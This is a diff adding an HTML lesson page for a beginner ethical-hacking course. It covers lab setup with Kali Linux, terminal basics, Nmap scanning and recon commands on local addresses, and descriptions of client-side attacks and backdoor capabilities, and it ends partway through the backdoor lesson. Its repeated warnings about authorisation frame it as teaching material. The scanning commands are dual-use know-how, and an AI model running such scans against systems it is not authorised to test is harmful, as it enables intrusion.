@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Week 1 — Ethical Hacking | TechCamp</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Exo+2:wght@300;400;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root { --sky:#0ea5e9; --sky-l:#38bdf8; --sky-p:#7dd3fc; --dark:#020e2e; --red:#ef4444; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--dark); font-family:'Exo 2',sans-serif; color:#fff; min-height:100vh; }
+
+  .grid-bg {
+    position:fixed; inset:0; z-index:0; pointer-events:none;
+    background-image:linear-gradient(rgba(14,165,233,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(14,165,233,0.04) 1px,transparent 1px);
+    background-size:40px 40px;
+  }
+  .blob { position:fixed; border-radius:50%; filter:blur(90px); pointer-events:none; z-index:0; }
+  .b1 { width:350px;height:350px; background:rgba(239,68,68,0.12); top:-80px; right:-80px; }
+  .b2 { width:300px;height:300px; background:rgba(14,165,233,0.1); bottom:0; left:-60px; }
+
+  .wrap { position:relative; z-index:1; max-width:720px; margin:0 auto; padding:30px 18px 70px; }
+
+  /* NAV */
+  .nav { display:flex; align-items:center; justify-content:space-between; margin-bottom:32px; }
+  .nav a { text-decoration:none; color:var(--sky-p); font-size:12px; font-weight:700; letter-spacing:1px; }
+  .week-badge {
+    background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.4);
+    color:#fca5a5; font-size:10px; font-weight:700; letter-spacing:2px;
+    text-transform:uppercase; padding:6px 14px; border-radius:50px;
+  }
+
+  /* HERO */
+  .hero { text-align:center; margin-bottom:40px; }
+  .hero-icon { font-size:52px; margin-bottom:12px; filter:drop-shadow(0 0 20px rgba(239,68,68,0.5)); }
+  .hero-title { font-family:'Orbitron',monospace; font-weight:900; font-size:28px; color:#fff; text-shadow:0 0 30px rgba(239,68,68,0.4); margin-bottom:8px; }
+  .hero-sub { font-size:13px; font-weight:300; color:rgba(255,255,255,0.5); line-height:1.7; }
+  .hero-dates { display:inline-block; margin-top:12px; background:rgba(239,68,68,0.12); border:1px solid rgba(239,68,68,0.3); border-radius:50px; padding:6px 16px; font-size:11px; font-weight:700; color:#fca5a5; letter-spacing:2px; }
+
+  /* PROGRESS */
+  .progress-strip { display:flex; gap:6px; margin-bottom:36px; }
+  .p-day {
+    flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1);
+    border-radius:8px; padding:10px 6px; text-align:center; cursor:pointer; transition:all 0.2s;
+  }
+  .p-day.active { background:rgba(239,68,68,0.2); border-color:rgba(239,68,68,0.5); }
+  .p-day:hover { background:rgba(255,255,255,0.1); }
+  .p-num { font-family:'Orbitron',monospace; font-size:14px; font-weight:700; color:#fff; }
+  .p-label { font-size:8px; color:rgba(255,255,255,0.4); letter-spacing:1px; margin-top:3px; }
+
+  /* LESSON SECTIONS */
+  .lesson { display:none; }
+  .lesson.active { display:block; }
+
+  /* SLIDE */
+  .slide {
+    background:linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+    border:1px solid rgba(125,211,252,0.15); border-radius:16px;
+    padding:28px 24px; margin-bottom:20px; position:relative; overflow:hidden;
+  }
+  .slide::before {
+    content:''; position:absolute; top:0; left:0; right:0; height:3px;
+    background:linear-gradient(90deg,var(--red),var(--sky));
+  }
+  .slide-num {
+    position:absolute; top:16px; right:18px;
+    font-family:'Orbitron',monospace; font-size:11px; font-weight:700;
+    color:rgba(255,255,255,0.12); letter-spacing:1px;
+  }
+  .slide-tag { font-size:9px; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:var(--sky-p); margin-bottom:10px; }
+  .slide-title { font-size:20px; font-weight:800; color:#fff; margin-bottom:14px; line-height:1.3; }
+  .slide-body { font-size:13.5px; font-weight:400; color:rgba(255,255,255,0.7); line-height:1.8; }
+  .slide-body p { margin-bottom:10px; }
+  .slide-body strong { color:#fff; font-weight:700; }
+
+  /* VISUAL CARDS inside slides */
+  .vis-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:16px; }
+  .vis-card {
+    background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.12);
+    border-radius:10px; padding:14px; text-align:center;
+  }
+  .vis-icon { font-size:28px; margin-bottom:6px; filter:drop-shadow(0 0 6px rgba(125,211,252,0.4)); }
+  .vis-label { font-size:12px; font-weight:700; color:#fff; margin-bottom:3px; }
+  .vis-desc { font-size:10px; color:rgba(255,255,255,0.45); font-weight:300; line-height:1.4; }
+
+  /* CODE BLOCK */
+  .code-block {
+    background:#0a0f1e; border:1px solid rgba(125,211,252,0.2);
+    border-radius:10px; padding:18px; margin:14px 0; overflow-x:auto;
+  }
+  .code-block pre { font-family:'Fira Code',monospace; font-size:12px; color:#e2e8f0; line-height:1.7; white-space:pre; }
+  .code-block .kw { color:#38bdf8; }
+  .code-block .str { color:#86efac; }
+  .code-block .cm { color:#64748b; }
+  .code-lang { font-size:9px; font-weight:700; letter-spacing:2px; color:var(--sky-p); margin-bottom:8px; text-transform:uppercase; }
+
+  /* STEPS */
+  .steps { display:flex; flex-direction:column; gap:10px; margin-top:14px; }
+  .step { display:flex; gap:14px; align-items:flex-start; }
+  .step-num {
+    width:28px; height:28px; border-radius:50%; flex-shrink:0;
+    background:rgba(239,68,68,0.2); border:1px solid rgba(239,68,68,0.4);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Orbitron',monospace; font-size:11px; font-weight:700; color:#fca5a5;
+  }
+  .step-text { font-size:13px; color:rgba(255,255,255,0.7); line-height:1.6; padding-top:4px; }
+  .step-text strong { color:#fff; }
+
+  /* KEY TERMS */
+  .terms-grid { display:flex; flex-direction:column; gap:8px; margin-top:14px; }
+  .term {
+    background:rgba(255,255,255,0.04); border-left:3px solid var(--sky);
+    border-radius:0 8px 8px 0; padding:10px 14px;
+  }
+  .term-word { font-size:13px; font-weight:700; color:var(--sky-l); margin-bottom:2px; }
+  .term-def { font-size:11.5px; color:rgba(255,255,255,0.6); line-height:1.5; }
+
+  /* WARNING BOX */
+  .warn-box {
+    background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.3);
+    border-radius:10px; padding:14px 16px; margin-top:14px;
+    display:flex; gap:10px; align-items:flex-start;
+  }
+  .warn-icon { font-size:18px; flex-shrink:0; }
+  .warn-text { font-size:12px; color:rgba(255,165,165,0.85); line-height:1.6; }
+
+  /* TIP BOX */
+  .tip-box {
+    background:rgba(14,165,233,0.08); border:1px solid rgba(14,165,233,0.25);
+    border-radius:10px; padding:14px 16px; margin-top:14px;
+    display:flex; gap:10px; align-items:flex-start;
+  }
+  .tip-icon { font-size:18px; flex-shrink:0; }
+  .tip-text { font-size:12px; color:rgba(125,211,252,0.85); line-height:1.6; }
+
+  /* DOWNLOAD / LINK CARD */
+  .link-card {
+    background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.2);
+    border-radius:10px; padding:14px 16px; margin-bottom:10px;
+    display:flex; align-items:center; gap:12px; text-decoration:none;
+  }
+  .link-card:hover { background:rgba(255,255,255,0.09); }
+  .link-icon { font-size:22px; flex-shrink:0; }
+  .link-info { flex:1; }
+  .link-title { font-size:13px; font-weight:700; color:#fff; }
+  .link-url { font-size:10px; color:rgba(125,211,252,0.6); margin-top:2px; }
+  .link-arr { color:rgba(125,211,252,0.4); font-size:18px; }
+
+  /* DIAGRAM — network visual */
+  .diagram {
+    background:#0a0f1e; border:1px solid rgba(125,211,252,0.15);
+    border-radius:12px; padding:20px; margin:14px 0; text-align:center;
+  }
+  .diag-row { display:flex; align-items:center; justify-content:center; gap:6px; margin:6px 0; flex-wrap:wrap; }
+  .diag-node {
+    background:rgba(14,165,233,0.15); border:1px solid rgba(14,165,233,0.35);
+    border-radius:8px; padding:8px 12px; font-size:11px; font-weight:700; color:#7dd3fc;
+    white-space:nowrap;
+  }
+  .diag-node.red { background:rgba(239,68,68,0.15); border-color:rgba(239,68,68,0.35); color:#fca5a5; }
+  .diag-node.green { background:rgba(34,197,94,0.15); border-color:rgba(34,197,94,0.35); color:#86efac; }
+  .diag-arrow { color:rgba(255,255,255,0.3); font-size:18px; }
+  .diag-label { font-size:9px; color:rgba(255,255,255,0.35); letter-spacing:2px; text-transform:uppercase; margin-bottom:12px; }
+
+  /* SCREENSHOT BOX */
+  .screenshot-box {
+    background:#0a0f1e; border:1px solid rgba(125,211,252,0.2);
+    border-radius:10px; padding:16px; margin:14px 0;
+  }
+  .ss-label { font-size:9px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:rgba(125,211,252,0.5); margin-bottom:10px; }
+  .ss-content { display:flex; flex-direction:column; gap:6px; }
+  .ss-row { display:flex; gap:10px; align-items:flex-start; flex-wrap:wrap; }
+  .ss-path { font-family:'Fira Code',monospace; font-size:11px; color:#38bdf8; flex-shrink:0; }
+  .ss-desc { font-size:11px; color:rgba(255,255,255,0.5); line-height:1.5; }
+
+  /* NAV BUTTONS */
+  .lesson-nav { display:flex; gap:10px; margin-top:28px; }
+  .nav-btn {
+    flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(125,211,252,0.2);
+    border-radius:10px; padding:14px; text-align:center; cursor:pointer;
+    font-family:'Exo 2',sans-serif; font-size:13px; font-weight:700; color:#fff;
+    transition:all 0.2s;
+  }
+  .nav-btn:hover { background:rgba(255,255,255,0.12); }
+  .nav-btn.primary { background:rgba(14,165,233,0.2); border-color:rgba(14,165,233,0.4); }
+
+  footer { text-align:center; margin-top:40px; font-size:11px; color:rgba(255,255,255,0.2); }
+</style>
+</head>
+<body>
+<script>if(sessionStorage.getItem("tc_auth")!=="true"){window.location.replace("index.html");}</script>
+<div class="grid-bg"></div>
+<div class="blob b1"></div>
+<div class="blob b2"></div>
+
+<div class="wrap">
+  <nav class="nav">
+    <a href="index.html">← Back to Hub</a>
+    <div class="week-badge">⚡ Week 1</div>
+  </nav>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-icon">🔐</div>
+    <div class="hero-title">Ethical Hacking Fundamentals</div>
+    <p class="hero-sub">Learn how hackers think — and how to defend against them.<br>We'll set up your hacking lab and explore real tools used by professionals.</p>
+    <div class="hero-dates">Apr 2 – Apr 8, 2026</div>
+  </div>
+
+  <!-- DAY TABS -->
+  <div class="progress-strip">
+    <div class="p-day active" onclick="showDay(1)"><div class="p-num">1</div><div class="p-label">Day</div></div>
+    <div class="p-day" onclick="showDay(2)"><div class="p-num">2</div><div class="p-label">Day</div></div>
+    <div class="p-day" onclick="showDay(3)"><div class="p-num">3</div><div class="p-label">Day</div></div>
+    <div class="p-day" onclick="showDay(4)"><div class="p-num">4</div><div class="p-label">Day</div></div>
+    <div class="p-day" onclick="showDay(5)"><div class="p-num">5</div><div class="p-label">Day</div></div>
+  </div>
+
+  <!-- ===== DAY 1 ===== -->
+  <div class="lesson active" id="day1">
+
+    <div class="slide">
+      <div class="slide-num">01 / 04</div>
+      <div class="slide-tag">Day 1 · Introduction</div>
+      <div class="slide-title">What is Ethical Hacking?</div>
+      <div class="slide-body">
+        <p>Ethical hacking — also called <strong>penetration testing</strong> — is the practice of intentionally trying to break into a computer system, network, or application <strong>with permission</strong>, in order to find weaknesses before malicious hackers do.</p>
+        <p>Think of it like hiring a locksmith to try to break into your own house — so you can see where your security is weak.</p>
+      </div>
+      <div class="vis-grid">
+        <div class="vis-card">
+          <div class="vis-icon">😈</div>
+          <div class="vis-label">Black Hat</div>
+          <div class="vis-desc">Malicious hacker. Breaks in without permission. Illegal.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🤍</div>
+          <div class="vis-label">White Hat</div>
+          <div class="vis-desc">Ethical hacker. Has permission. Helps fix vulnerabilities.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🩶</div>
+          <div class="vis-label">Grey Hat</div>
+          <div class="vis-desc">Hacks without permission but reports findings. Gray area.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">💼</div>
+          <div class="vis-label">Pen Tester</div>
+          <div class="vis-desc">Professional ethical hacker hired by companies.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-num">02 / 04</div>
+      <div class="slide-tag">Day 1 · The Law</div>
+      <div class="slide-title">⚖️ Ethics & The Law — Very Important</div>
+      <div class="slide-body">
+        <p>Everything we learn in this course is for <strong>educational and defensive purposes only</strong>. Using these skills without permission is a criminal offence in Ghana and globally.</p>
+      </div>
+      <div class="warn-box">
+        <div class="warn-icon">🚨</div>
+        <div class="warn-text"><strong>Golden Rule:</strong> Never scan, attack, or access any system, network, or device that you do not own or do not have explicit written permission to test. Even scanning someone's network without permission can be illegal.</div>
+      </div>
+      <div class="terms-grid" style="margin-top:16px;">
+        <div class="term"><div class="term-word">Authorisation</div><div class="term-def">Written permission from the owner of a system to test it. Always get this first.</div></div>
+        <div class="term"><div class="term-word">Scope</div><div class="term-def">The agreed boundaries of what you're allowed to test. Stay within scope at all times.</div></div>
+        <div class="term"><div class="term-word">Responsible Disclosure</div><div class="term-def">If you find a real vulnerability, report it to the owner — don't exploit it.</div></div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-num">03 / 04</div>
+      <div class="slide-tag">Day 1 · The Hacking Process</div>
+      <div class="slide-title">The 5 Phases of Ethical Hacking</div>
+      <div class="slide-body"><p>Every professional penetration test follows these stages:</p></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-text"><strong>Reconnaissance</strong> — Gather information about the target (domain names, IPs, employee names, open ports). Passive or active.</div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-text"><strong>Scanning & Enumeration</strong> — Use tools to map the network, find open ports, running services, and OS versions.</div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-text"><strong>Gaining Access</strong> — Exploit discovered vulnerabilities to get into the system.</div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-text"><strong>Maintaining Access</strong> — See if you can stay inside without being detected (simulates real attackers).</div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-text"><strong>Reporting</strong> — Document everything found and give recommendations to fix the issues.</div></div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-num">04 / 04</div>
+      <div class="slide-tag">Day 1 · Key Terms</div>
+      <div class="slide-title">📚 Vocabulary to Know</div>
+      <div class="terms-grid">
+        <div class="term"><div class="term-word">Vulnerability</div><div class="term-def">A weakness in a system that can be exploited.</div></div>
+        <div class="term"><div class="term-word">Exploit</div><div class="term-def">Code or a technique that takes advantage of a vulnerability.</div></div>
+        <div class="term"><div class="term-word">Payload</div><div class="term-def">The part of the attack that does the actual work (e.g. creates a backdoor).</div></div>
+        <div class="term"><div class="term-word">IP Address</div><div class="term-def">A unique number that identifies a device on a network. Like a home address for computers.</div></div>
+        <div class="term"><div class="term-word">Port</div><div class="term-def">A virtual door on a computer. Different services use different ports (e.g. Port 80 = websites).</div></div>
+        <div class="term"><div class="term-word">Firewall</div><div class="term-def">Software or hardware that monitors and controls incoming/outgoing network traffic.</div></div>
+      </div>
+    </div>
+
+    <div class="lesson-nav">
+      <div class="nav-btn primary" onclick="showDay(2)">Next: VMware Setup →</div>
+    </div>
+  </div>
+
+  <!-- ===== DAY 2 ===== -->
+  <div class="lesson" id="day2">
+
+    <div class="slide">
+      <div class="slide-tag">Day 2 · Lab Setup</div>
+      <div class="slide-title">🖥️ Setting Up Your Virtual Lab</div>
+      <div class="slide-body">
+        <p>We'll use a <strong>Virtual Machine (VM)</strong> — a computer that runs inside your computer. This keeps our hacking tools isolated and safe. We will not be hacking on our main system.</p>
+        <p>We need two things: <strong>VMware</strong> (the program that creates the VM) and <strong>Kali Linux</strong> (the operating system we'll run inside it).</p>
+      </div>
+      <div class="diagram">
+        <div class="diag-label">How a Virtual Machine Works</div>
+        <div class="diag-row">
+          <div class="diag-node green">Your Physical Computer (Host)</div>
+        </div>
+        <div class="diag-row"><div class="diag-arrow">↓</div></div>
+        <div class="diag-row">
+          <div class="diag-node">VMware Workstation Player</div>
+        </div>
+        <div class="diag-row"><div class="diag-arrow">↓</div></div>
+        <div class="diag-row">
+          <div class="diag-node red">Kali Linux VM (Guest) — isolated hacking lab</div>
+        </div>
+      </div>
+      <div class="tip-box">
+        <div class="tip-icon">💡</div>
+        <div class="tip-text">Your host computer needs at least <strong>8GB RAM</strong> and <strong>50GB free disk space</strong> to run a VM comfortably. 4GB RAM can work but will be slow.</div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 2 · VMware</div>
+      <div class="slide-title">Step 1 — Download & Install VMware</div>
+      <div class="slide-body"><p>VMware Workstation Player is free for personal use. Follow these steps:</p></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-text">Go to <strong>vmware.com</strong> → Products → Workstation Player → Download for free.</div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-text">Choose your OS: <strong>Windows</strong> or <strong>Linux</strong> installer.</div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-text">Run the installer and click <strong>Next</strong> through all steps. Accept the license agreement.</div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-text">When asked, choose <strong>"Use VMware Workstation Player for free for non-commercial use"</strong>.</div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-num" style="width:auto;height:auto;background:transparent;border:none;font-size:13px;color:rgba(255,255,255,0.7);font-family:'Exo 2',sans-serif;font-weight:400;padding:4px 0;">Restart your computer after installation.</div></div>
+      </div>
+      <a class="link-card" href="https://www.vmware.com/products/workstation-player.html" target="_blank">
+        <div class="link-icon">⬇️</div>
+        <div class="link-info">
+          <div class="link-title">VMware Workstation Player</div>
+          <div class="link-url">vmware.com → Workstation Player → Free Download</div>
+        </div>
+        <div class="link-arr">›</div>
+      </a>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 2 · Kali Linux</div>
+      <div class="slide-title">Step 2 — Download Kali Linux</div>
+      <div class="slide-body">
+        <p><strong>Kali Linux</strong> is a special version of Linux built for cybersecurity professionals. It comes pre-installed with hundreds of hacking tools like Nmap, Metasploit, Wireshark and more.</p>
+        <p>We'll download the <strong>VMware image</strong> version — this means Kali is already packaged for VMware. No manual installation needed!</p>
+      </div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-text">Go to <strong>kali.org/get-kali</strong> → choose <strong>Virtual Machines</strong> tab.</div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-text">Download the <strong>VMware 64-bit</strong> version (it's a .7z or .zip file, around 3GB).</div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-text">Extract the downloaded file using <strong>7-Zip</strong> (free at 7-zip.org).</div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-text">Inside the extracted folder, find the <strong>.vmx file</strong> — double-click it to open in VMware.</div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-text">Click <strong>"Play virtual machine"</strong>. Kali will boot up!</div></div>
+      </div>
+      <a class="link-card" href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">
+        <div class="link-icon">🐉</div>
+        <div class="link-info">
+          <div class="link-title">Kali Linux — Virtual Machine Image</div>
+          <div class="link-url">kali.org/get-kali → Virtual Machines → VMware</div>
+        </div>
+        <div class="link-arr">›</div>
+      </a>
+      <div class="tip-box">
+        <div class="tip-icon">🔑</div>
+        <div class="tip-text">Default Kali login credentials: <strong>Username: kali</strong> &nbsp;|&nbsp; <strong>Password: kali</strong></div>
+      </div>
+    </div>
+
+    <div class="lesson-nav">
+      <div class="nav-btn" onclick="showDay(1)">← Day 1</div>
+      <div class="nav-btn primary" onclick="showDay(3)">Next: Kali Basics →</div>
+    </div>
+  </div>
+
+  <!-- ===== DAY 3 ===== -->
+  <div class="lesson" id="day3">
+
+    <div class="slide">
+      <div class="slide-tag">Day 3 · Kali Linux</div>
+      <div class="slide-title">🐉 Navigating Kali Linux</div>
+      <div class="slide-body">
+        <p>Kali Linux uses a <strong>command-line terminal</strong> as its main tool. Unlike Windows where you click icons, in Kali you type commands. This might feel strange at first — but within days it will feel natural.</p>
+        <p>Open the terminal by clicking the <strong>black screen icon</strong> at the top of Kali, or press <strong>Ctrl + Alt + T</strong>.</p>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 3 · Terminal Basics</div>
+      <div class="slide-title">Essential Terminal Commands</div>
+      <div class="slide-body"><p>These are the most important commands every hacker must know:</p></div>
+      <div class="code-lang">bash — terminal</div>
+      <div class="code-block"><pre><span class="cm"># Print current directory (where you are)</span>
+pwd
+
+<span class="cm"># List files in current folder</span>
+ls -la
+
+<span class="cm"># Change directory</span>
+cd Desktop
+cd ..          <span class="cm"># go back one folder</span>
+
+<span class="cm"># Create a new folder</span>
+mkdir myfolder
+
+<span class="cm"># Create a new file</span>
+touch notes.txt
+
+<span class="cm"># Show contents of a file</span>
+cat notes.txt
+
+<span class="cm"># Find out your IP address</span>
+ip addr
+
+<span class="cm"># Update Kali Linux tools</span>
+sudo apt update && sudo apt upgrade</pre></div>
+      <div class="tip-box">
+        <div class="tip-icon">⌨️</div>
+        <div class="tip-text">Press the <strong>Up arrow key</strong> in terminal to repeat your last command. Press <strong>Tab</strong> to auto-complete file and folder names. These will save you lots of typing!</div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 3 · Kali Tools</div>
+      <div class="slide-title">🛠️ Key Tools in Kali Linux</div>
+      <div class="slide-body"><p>Kali comes with 600+ tools. Here are the main ones we will use this week:</p></div>
+      <div class="vis-grid">
+        <div class="vis-card">
+          <div class="vis-icon">🗺️</div>
+          <div class="vis-label">Nmap</div>
+          <div class="vis-desc">Network scanner. Discovers devices and open ports.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🦈</div>
+          <div class="vis-label">Wireshark</div>
+          <div class="vis-desc">Captures and analyzes network traffic in real time.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">💣</div>
+          <div class="vis-label">Metasploit</div>
+          <div class="vis-desc">Framework for exploiting vulnerabilities. Very powerful.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🔑</div>
+          <div class="vis-label">John the Ripper</div>
+          <div class="vis-desc">Password cracking tool. Tests password strength.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🌐</div>
+          <div class="vis-label">Burp Suite</div>
+          <div class="vis-desc">Tests web application security.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">📡</div>
+          <div class="vis-label">Aircrack-ng</div>
+          <div class="vis-desc">Tests WiFi network security.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lesson-nav">
+      <div class="nav-btn" onclick="showDay(2)">← Day 2</div>
+      <div class="nav-btn primary" onclick="showDay(4)">Next: Nmap & Scanning →</div>
+    </div>
+  </div>
+
+  <!-- ===== DAY 4 ===== -->
+  <div class="lesson" id="day4">
+
+    <div class="slide">
+      <div class="slide-tag">Day 4 · Networking</div>
+      <div class="slide-title">🌐 How Networks Work</div>
+      <div class="slide-body">
+        <p>Before you can hack anything, you need to understand how computers talk to each other. A <strong>network</strong> is a group of devices connected together to share data.</p>
+      </div>
+      <div class="diagram">
+        <div class="diag-label">Typical Home / Office Network</div>
+        <div class="diag-row">
+          <div class="diag-node green">Internet</div>
+          <div class="diag-arrow">↔</div>
+          <div class="diag-node">Router (192.168.1.1)</div>
+        </div>
+        <div class="diag-row"><div class="diag-arrow">↙ &nbsp; ↓ &nbsp; ↘</div></div>
+        <div class="diag-row">
+          <div class="diag-node">.101 Laptop</div>
+          <div class="diag-node">.102 Phone</div>
+          <div class="diag-node red">.103 Your Kali VM</div>
+        </div>
+      </div>
+      <div class="terms-grid">
+        <div class="term"><div class="term-word">IP Address</div><div class="term-def">Every device on a network gets a unique address. Local IPs often start with 192.168.x.x</div></div>
+        <div class="term"><div class="term-word">Router</div><div class="term-def">The device that connects your local network to the internet and assigns IP addresses.</div></div>
+        <div class="term"><div class="term-word">Port</div><div class="term-def">A number (0–65535) that identifies a specific service. Port 22=SSH, 80=HTTP, 443=HTTPS.</div></div>
+        <div class="term"><div class="term-word">MAC Address</div><div class="term-def">A permanent hardware address burned into every network card. Like a serial number.</div></div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 4 · Nmap</div>
+      <div class="slide-title">🗺️ Scanning with Nmap</div>
+      <div class="slide-body">
+        <p><strong>Nmap</strong> (Network Mapper) is the most famous tool for discovering what's on a network. It shows you which devices are online and what services they're running.</p>
+        <p>We will only scan our <strong>own VM network</strong> — never external or real networks without permission.</p>
+      </div>
+      <div class="code-lang">nmap commands</div>
+      <div class="code-block"><pre><span class="cm"># Find your own IP address first</span>
+ip addr
+
+<span class="cm"># Scan your local network for live devices</span>
+nmap <span class="str">192.168.1.0/24</span>
+
+<span class="cm"># Detailed scan of a specific IP (shows open ports)</span>
+nmap -sV <span class="str">192.168.1.1</span>
+
+<span class="cm"># Fast scan — most common 100 ports</span>
+nmap -F <span class="str">192.168.1.1</span>
+
+<span class="cm"># Operating system detection</span>
+nmap -O <span class="str">192.168.1.1</span>
+
+<span class="cm"># All-in-one scan (version, OS, scripts)</span>
+nmap -A <span class="str">192.168.1.1</span></pre></div>
+      <div class="warn-box">
+        <div class="warn-icon">⚠️</div>
+        <div class="warn-text">Only scan <strong>192.168.x.x</strong> addresses (your local network) during practice. Never run Nmap against websites, servers, or networks you don't own.</div>
+      </div>
+    </div>
+
+    <div class="slide">
+      <div class="slide-tag">Day 4 · Reconnaissance</div>
+      <div class="slide-title">🔍 Information Gathering</div>
+      <div class="slide-body"><p>Reconnaissance is the first phase of hacking — collecting as much info as possible before attacking. Here are some beginner tools:</p></div>
+      <div class="code-lang">terminal commands</div>
+      <div class="code-block"><pre><span class="cm"># Ping — check if a host is alive</span>
+ping google.com
+
+<span class="cm"># Whois — find who owns a domain</span>
+whois example.com
+
+<span class="cm"># DNS lookup — find IP of a domain</span>
+nslookup example.com
+
+<span class="cm"># Traceroute — see the path packets take</span>
+traceroute google.com</pre></div>
+      <div class="tip-box">
+        <div class="tip-icon">🎯</div>
+        <div class="tip-text"><strong>Practice target:</strong> Use <strong>scanme.nmap.org</strong> — this is a server Nmap provides specifically for people to practice scanning legally. It's safe and permitted.</div>
+      </div>
+    </div>
+
+    <div class="lesson-nav">
+      <div class="nav-btn" onclick="showDay(3)">← Day 3</div>
+      <div class="nav-btn primary" onclick="showDay(5)">Next: Backdoors & Payloads →</div>
+    </div>
+  </div>
+
+  <!-- ===== DAY 5 — BACKDOORS, CLIENT-SIDE ATTACKS, MSFVENOM ===== -->
+  <div class="lesson" id="day5">
+
+    <!-- SLIDE 1: Client-Side Attacks -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · Attack Types</div>
+      <div class="slide-title">🎭 What is a Client-Side Attack?</div>
+      <div class="slide-body">
+        <p>So far we've looked at scanning and recon. Now let's talk about <strong>how attackers actually get into a system</strong>. One of the most common methods is a <strong>client-side attack</strong>.</p>
+        <p>A <strong>client-side attack</strong> targets the <strong>user</strong> rather than the server. Instead of hacking a firewall or a server directly, the attacker tricks the victim into running a malicious file or clicking a bad link — the victim's own computer does the work.</p>
+      </div>
+      <div class="vis-grid">
+        <div class="vis-card">
+          <div class="vis-icon">📧</div>
+          <div class="vis-label">Phishing Email</div>
+          <div class="vis-desc">Victim gets an email with a fake link or attachment that runs malware.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">📁</div>
+          <div class="vis-label">Malicious File</div>
+          <div class="vis-desc">A file (.exe, .pdf, .docx) that looks normal but runs a payload when opened.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">🌐</div>
+          <div class="vis-label">Fake Website</div>
+          <div class="vis-desc">A copied website that installs malware when the victim visits it.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">💾</div>
+          <div class="vis-label">USB Drop Attack</div>
+          <div class="vis-desc">A USB stick left in a parking lot — curious person plugs it in and gets hacked.</div>
+        </div>
+      </div>
+      <div class="warn-box">
+        <div class="warn-icon">🚨</div>
+        <div class="warn-text"><strong>Educational purpose only.</strong> In this class we perform all demonstrations on our <strong>own virtual machines</strong>. Never attempt this on any real person's device without written permission.</div>
+      </div>
+    </div>
+
+    <!-- SLIDE 2: What is a Backdoor -->
+    <div class="slide">
+      <div class="slide-tag">Day 5 · Backdoors</div>
+      <div class="slide-title">🚪 What is a Backdoor?</div>
+      <div class="slide-body">
+        <p>A <strong>backdoor</strong> is a hidden program secretly installed on a target computer that gives an attacker <strong>remote control</strong> of that machine over the internet or a network — without the victim knowing.</p>
+        <p>Think of it like secretly making a copy of someone's house key and hiding it under the mat. The owner doesn't know you have it, but you can enter anytime.</p>
+      </div>
+      <div class="vis-grid">
+        <div class="vis-card">
+          <div class="vis-icon">🖥️</div>
+          <div class="vis-label">Remote Desktop</div>
+          <div class="vis-desc">See and control the victim's screen live in real time.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">📷</div>
+          <div class="vis-label">Webcam Access</div>
+          <div class="vis-desc">Activate the victim's webcam without them knowing.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">⌨️</div>
+          <div class="vis-label">Keylogger</div>
+          <div class="vis-desc">Record every key the victim types — passwords, messages, everything.</div>
+        </div>
+        <div class="vis-card">
+          <div class="vis-icon">📂</div>
+          <div class="vis-label">File Access</div>
+          <div class="vis-desc">Browse, upload, download or delete files on the victim's computer.</div>
+        </div>
+      </div>
+      <div class="tip-box">
+        <div class="tip-icon">💡</div>
